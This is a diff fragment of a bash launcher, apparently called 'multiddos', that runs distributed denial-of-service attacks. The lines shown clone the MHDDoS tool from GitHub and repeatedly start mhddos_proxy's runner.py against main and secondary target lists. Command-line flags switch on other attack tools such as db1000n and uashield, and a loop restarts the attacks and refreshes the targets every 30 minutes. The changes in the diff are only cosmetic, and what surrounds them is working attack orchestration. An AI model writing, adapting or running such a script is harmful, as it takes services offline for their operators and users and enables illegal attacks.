@@ -23,8 +23,6 @@ typing_on_screen (){
 }
 export -f typing_on_screen
 
-
-
 #if launched in docker than variables saved in docker md.sh will be used
 if [[ $docker_mode != "true" ]]; then
     gotop="on"
@@ -82,9 +80,7 @@ clear
 toilet -t --metal "Український" && sleep 0.1
 toilet -t --metal "   жнець" && sleep 0.1
 toilet -t --metal " MULTIDDOS" && sleep 0.1
-
 typing_on_screen 'Шукаю завдання...'
-
 sleep 1
 echo -e "\n" && sleep 0.1
 echo -e "Secondary targets:" "\x1b[32m $(cat $sec_targets | sort | uniq | wc -l)\x1b[m" && sleep 0.1
@@ -98,7 +94,6 @@ clear
 export -f prepare_targets_and_banner
 
 launch () {
-
 
 # kill previous sessions or processes in case they still in memory
 tmux kill-session -t multiddos > /dev/null 2>&1
@@ -161,7 +156,6 @@ while [ "$1" != "" ]; do
         +d | --db1000n )   db1000n="on"; shift ;;
         +u | --uashield )   uashield="on"; shift ;;
         -t | --threads )   export threads="-t $2"; t_set_manual="on"; shift 2 ;;
-        +m | --matrix )   matrix="on"; shift ;;
         -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
         +v | --vnstat ) vnstat="on"; shift ;;
         -h | --help )    usage;   exit ;;
@@ -202,7 +196,6 @@ git clone https://github.com/MHProDev/MHDDoS.git
 # Restart attacks and update targets every 30 minutes
 while true; do
 echo "threads: "$threads; echo "methods: "$methods
-sleep 2
         pkill -f start.py; pkill -f runner.py 
         python3 ~/multidd/mhddos_proxy/runner.py -c $main_targets $threads $methods&
         sleep 15 # to decrease load on cpu during simultaneous start
